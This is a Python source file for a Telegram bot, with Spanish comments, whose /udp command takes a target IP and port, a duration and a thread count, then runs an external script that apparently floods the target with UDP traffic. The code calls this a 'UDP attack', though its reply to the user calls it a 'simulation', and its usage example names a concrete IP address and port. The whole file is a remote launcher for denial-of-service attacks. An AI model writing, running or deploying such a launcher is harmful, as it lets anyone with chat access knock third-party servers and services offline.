from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
import subprocess

# Token del bot (obtén el token de @BotFather en Telegram)
TOKEN = "TU_TOKEN_AQUÍ"

# Comando para iniciar un ataque UDP
async def udp_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Verifica que el usuario haya ingresado los parámetros necesarios
    if len(context.args) < 3:
        await update.message.reply_text(
            "Uso: /udp <IP:Puerto> <Duración> <Threads>\nEjemplo: /udp 143.92.114.176:10015 53 999"
        )
        return

    # Obtiene los argumentos del mensaje
    target = context.args[0]  # Dirección IP:Puerto
    duration = context.args[1]  # Duración en segundos
    threads = context.args[2]  # Número de threads

    # Construye el comando a ejecutar
    command = f"python3 start.py UDP {target} {duration} {threads}"
    
    # Ejecuta el comando y responde al usuario
    try:
        process = subprocess.Popen(command.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        await update.message.reply_text(
            f"Simulación UDP iniciada:\n- Target: {target}\n- Duración: {duration} segundos\n- Threads: {threads}"
        )
    except Exception as e:
        await update.message.reply_text(f"Error al ejecutar el comando:\n{str(e)}")

# Configuración principal del bot
def main():
    # Crea la aplicación del bot
    application = Application.builder().token(TOKEN).build()

    # Agrega el handler para el comando /udp
    application.add_handler(CommandHandler("udp", udp_attack))

    # Inicia el bot
    application.run_polling()

if __name__ == "__main__":
    main()
